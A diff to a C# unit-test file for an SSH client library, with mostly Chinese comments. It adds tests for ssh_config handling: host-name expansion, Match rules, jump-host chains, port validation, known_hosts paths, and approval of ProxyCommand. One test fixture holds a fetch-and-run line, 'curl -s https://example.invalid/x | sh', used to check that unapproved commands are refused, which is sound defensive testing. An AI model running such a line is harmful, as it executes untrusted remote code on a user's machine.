@@ -17,6 +17,26 @@ namespace VelaShell.Ssh.Tests.Config;
 [TestClass]
 public sealed class SshConfigConnectTests
 {
+    /// <summary>
+    /// 〔FW-E2〕<c>HostName</c> 里的 <c>%h</c> 换成输入的名字（<c>Host *.prod</c> 配 <c>HostName %h.example.com</c>），
+    /// <c>%%</c> 换成 <c>%</c>。曾经建连拿字面量 <c>%h.example.com</c> 去连。
+    /// </summary>
+    [TestMethod]
+    public async Task HostName里的百分号h在建连时展开()
+    {
+        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse("""
+            Host *.prod
+                HostName %h.example.com
+            Host odd
+                HostName odd%%name
+            """);
+
+        SshConnectionOptions options = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "db1.prod");
+        Assert.AreEqual("db1.prod.example.com", options.Host);
+
+        Assert.AreEqual("odd%name", SshConfigFile.Resolve(blocks, "odd").HostName);
+    }
+
     [TestMethod]
     public async Task 连接层的各项都落到连接参数上()
     {
@@ -76,6 +96,34 @@ public sealed class SshConfigConnectTests
         Assert.AreEqual("me", options.UserName, "目标没写 User 时用调用方给的默认用户名");
     }
 
+    /// <summary>
+    /// 建连路径上 <c>Match localuser</c> 照本机用户名判；跳板规格里写明的用户交给 <c>Match user</c>；目标的远端用户判不了，不匹配。
+    /// 曾经只给主机名，<c>localuser</c> 永远判不了。
+    /// </summary>
+    [TestMethod]
+    public async Task 建连时Match_localuser按本机用户判_跳板写明的用户交给Match_user()
+    {
+        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse($"""
+            Match host target localuser "{Environment.UserName}"
+                Port 2201
+            Match host other localuser nobody-at-all
+                Port 2202
+            Match host bastion user alice
+                Port 2203
+            Match host target user alice
+                Port 2204
+            Host target
+                ProxyJump alice@bastion
+            """);
+
+        SshConnectionOptions target = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "target");
+        Assert.AreEqual(2201, target.Port);
+        Assert.AreEqual(2203, ((SshJumpDialer)target.Dialer).JumpHost.Port, "跳板写明了 alice@，Match user alice 对那一跳成立");
+
+        SshConnectionOptions other = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "other");
+        Assert.AreEqual(22, other.Port, "本机用户对不上");
+    }
+
     [TestMethod]
     public async Task 跳板规格里显式的用户与端口优先()
     {
@@ -92,6 +140,91 @@ public sealed class SshConfigConnectTests
         var jump = (SshJumpDialer)options.Dialer;
         Assert.AreEqual("alice", jump.JumpHost.UserName);
         Assert.AreEqual(2022, jump.JumpHost.Port);
+    }
+
+    /// <summary>
+    /// 〔FW-E12〕ProxyJump 链里第一跳之后的跳板经前一跳到达：它们自己的 ProxyJump / ProxyCommand 不去解析。
+    /// 曾经先解析一遍再丢掉：白批准一次 ProxyCommand（没给批准回调时整个连接直接失败），用不上的那条链里有环也报错。
+    /// </summary>
+    [TestMethod]
+    public async Task 第二跳及以后的跳板不解析自己的拨号设置()
+    {
+        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse("""
+            Host target
+                ProxyJump a,b
+            Host b
+                ProxyCommand nc %h %p
+            Host a
+                ProxyJump none
+            Host c
+                ProxyJump a,d
+            Host d
+                ProxyJump c
+            """);
+
+        // 没给 ApproveProxyCommand：b 的 ProxyCommand 用不上，不该去要批准。
+        SshConnectionOptions options = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "target");
+        var last = (SshJumpDialer)options.Dialer;
+        Assert.AreEqual("b", last.JumpHost.Host);
+        Assert.IsInstanceOfType<SshJumpDialer>(last.JumpHost.Dialer, "b 经 a 到达");
+
+        // d 自己的 ProxyJump 指回 c（会成环），但 d 经 a 到达，那条链用不上，不报环。
+        _ = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "c");
+    }
+
+    /// <summary>
+    /// 〔FW-E12〕Host *.corp 带出来的 ProxyJump 落到跳板自己身上（跳板忘了写 ProxyJump none）：跳板直连，不报「链有环」。
+    /// </summary>
+    [TestMethod]
+    public async Task 跳板的ProxyJump指向自己时当成直连()
+    {
+        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse("""
+            Host *.corp
+                ProxyJump bastion.corp
+            """);
+
+        SshConnectionOptions options = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "app.corp");
+
+        var jump = (SshJumpDialer)options.Dialer;
+        Assert.AreEqual("bastion.corp", jump.JumpHost.Host);
+        Assert.IsInstanceOfType<TcpTransportDialer>(jump.JumpHost.Dialer, "跳板自己直连");
+    }
+    /// <summary>〔FW-E14〕端口配得不对（越界、带符号、不是数字）：建连时报配置错误、说清是哪台主机；Port 属性交出 22。</summary>
+    [TestMethod]
+    [DataRow("-1")]
+    [DataRow("0")]
+    [DataRow("99999")]
+    [DataRow("ssh")]
+    public async Task 端口配得不对时报配置错误(string port)
+    {
+        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse($"""
+            Host web
+                Port {port}
+            Host via
+                ProxyJump web:{port}
+            """);
+
+        Assert.AreEqual(22, SshConfigFile.Resolve(blocks, "web").Port);
+
+        SshConnectException error = await Assert.ThrowsExactlyAsync<SshConnectException>(
+            async () => await SshConfigFile.CreateConnectionOptionsAsync(blocks, "web"));
+        Assert.AreEqual(SshFailureReason.InvalidConfiguration, error.Reason);
+        Assert.Contains("web", error.Message);
+    }
+
+    /// <summary>〔FW-E14〕ProxyJump 规格里的端口越界：同样报配置错误。</summary>
+    [TestMethod]
+    public async Task 跳板规格里的端口越界时报配置错误()
+    {
+        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse("""
+            Host target
+                ProxyJump bastion:70000
+            """);
+
+        SshConnectException error = await Assert.ThrowsExactlyAsync<SshConnectException>(
+            async () => await SshConfigFile.CreateConnectionOptionsAsync(blocks, "target"));
+        Assert.AreEqual(SshFailureReason.InvalidConfiguration, error.Reason);
+        Assert.Contains("70000", error.Message);
     }
 
     [TestMethod]
@@ -123,16 +256,53 @@ public sealed class SshConfigConnectTests
                 ProxyCommand none
             """);
 
-        SshConnectionOptions viaCommand = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "viacmd");
+        List<SshProxyCommandRequest> asked = [];
+        SshConfigConnectOptions approveAll = new()
+        {
+            ApproveProxyCommand = (request, _) =>
+            {
+                asked.Add(request);
+                return ValueTask.FromResult(true);
+            },
+        };
+
+        SshConnectionOptions viaCommand = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "viacmd", approveAll);
         var command = (ProxyCommandDialer)viaCommand.Dialer;
         Assert.AreEqual("nc -x proxy:1080 %h %p", command.CommandTemplate);
         Assert.AreEqual("joe", command.UserName);
 
-        SshConnectionOptions both = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "both");
+        // 批准的是展开之后、将要执行的那一行。
+        SshProxyCommandRequest request = Assert.ContainsSingle(asked);
+        Assert.AreEqual("viacmd", request.Host);
+        Assert.AreEqual("nc -x proxy:1080 viacmd 22", request.Command);
+
+        SshConnectionOptions both = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "both", approveAll);
         Assert.IsInstanceOfType<SshJumpDialer>(both.Dialer);
+        Assert.HasCount(1, asked, "ProxyJump 压过 ProxyCommand 时那条命令用不上，也就不问");
 
         SshConnectionOptions none = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "none");
         Assert.IsInstanceOfType<TcpTransportDialer>(none.Dialer);
+    }
+
+    [TestMethod]
+    public async Task 配置里的ProxyCommand没被批准就不执行_也不悄悄直连()
+    {
+        // 与 Match exec 同一条理由：配置文件常常是从别处拷来的，
+        // 一行 Host * 加一行 ProxyCommand 就是「连任何一台主机都先在本机跑一个程序」。
+        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse("""
+            Host *
+                ProxyCommand curl -s https://example.invalid/x | sh
+            """);
+
+        SshConnectException noApprover = await Assert.ThrowsExactlyAsync<SshConnectException>(
+            async () => await SshConfigFile.CreateConnectionOptionsAsync(blocks, "web"));
+        Assert.AreEqual(SshFailureReason.InvalidConfiguration, noApprover.Reason);
+        Assert.Contains("ApproveProxyCommand", noApprover.Message);
+
+        SshConnectException denied = await Assert.ThrowsExactlyAsync<SshConnectException>(
+            async () => await SshConfigFile.CreateConnectionOptionsAsync(
+                blocks, "web", new SshConfigConnectOptions { ApproveProxyCommand = (_, _) => ValueTask.FromResult(false) }));
+        Assert.AreEqual(SshFailureReason.InvalidConfiguration, denied.Reason);
     }
 
     [TestMethod]
@@ -157,6 +327,42 @@ public sealed class SshConfigConnectTests
         SshConnectionOptions plain = await SshConfigFile.CreateConnectionOptionsAsync(
             blocks, "other", new SshConfigConnectOptions { HostKeyPolicy = given });
         Assert.AreSame(given, plain.HostKeyPolicy);
+    }
+
+    /// <summary>〔FW-E13〕UserKnownHostsFile 里的 %h / %r 照这台主机与用户展开（曾经代入空串，所有主机挤进同一个文件）。</summary>
+    [TestMethod]
+    public async Task UserKnownHostsFile里的百分号记号照主机与用户展开()
+    {
+        string directory = Path.Combine(Path.GetTempPath(), $"velashell-kh-{Guid.NewGuid():N}");
+        Directory.CreateDirectory(directory);
+        try
+        {
+            IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse($"""
+                Host web
+                    HostName web.example.com
+                    User deploy
+                    StrictHostKeyChecking accept-new
+                    UserKnownHostsFile {directory}/kh_%h_%r
+                """);
+
+            SshConnectionOptions options = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "web");
+
+            using var signer = Ssh.Auth.InMemorySshSigner.GenerateEd25519();
+            await options.HostKeyPolicy.PersistAsync(new SshHostKeyContext
+            {
+                Host = "web.example.com",
+                Port = 22,
+                Key = signer.PublicKey,
+                NegotiatedAlgorithm = SshAlgorithmNames.SshEd25519,
+            });
+
+            Assert.IsTrue(File.Exists(Path.Combine(directory, "kh_web.example.com_deploy")), "known_hosts 应当写到展开之后的路径");
+            Assert.IsFalse(File.Exists(Path.Combine(directory, "kh__")));
+        }
+        finally
+        {
+            Directory.Delete(directory, recursive: true);
+        }
     }
 
     [TestMethod]
@@ -328,7 +534,7 @@ public sealed class SshConfigConnectTests
         TimeSpan? Timeout(string host) => SshConfigFile.Resolve(blocks, host).ApplyToShell().X11Forwarding?.Timeout;
 
         Assert.AreEqual(TimeSpan.FromMinutes(90), Timeout("long"));
-        Assert.AreEqual(TimeSpan.Zero, Timeout("forever"));
+        Assert.AreEqual(System.Threading.Timeout.InfiniteTimeSpan, Timeout("forever"));
         Assert.AreEqual(X11ForwardOptions.Default.Timeout, Timeout("typo"), "写不对的值不猜，沿用默认");
         Assert.AreEqual(X11ForwardOptions.Default.Timeout, Timeout("unset"));
     }
@@ -372,7 +578,7 @@ public sealed class SshConfigConnectTests
 
         Assert.IsNotNull(shell.AgentForwarding);
         Assert.IsNotNull(shell.X11Forwarding);
-        Assert.IsTrue(shell.X11Forwarding.Trusted);
+        Assert.IsTrue(shell.X11Forwarding.IsTrusted);
 
         // §7.5.8：连接级开关打开的 X11 是尽力而为的 —— 失败不该让 shell 起不来。
         Assert.AreEqual(ForwardFailureMode.Continue, shell.X11Forwarding.FailureMode);
@@ -420,7 +626,7 @@ public sealed class SshConfigConnectTests
                 ForwardX11 yes
             """);
 
-        X11ForwardOptions explicitX11 = new() { Trusted = true };
+        X11ForwardOptions explicitX11 = new() { IsTrusted = true };
         SshShellOptions shell = SshConfigFile.Resolve(blocks, "gui")
             .ApplyToShell(new SshShellOptions { X11Forwarding = explicitX11 });
 
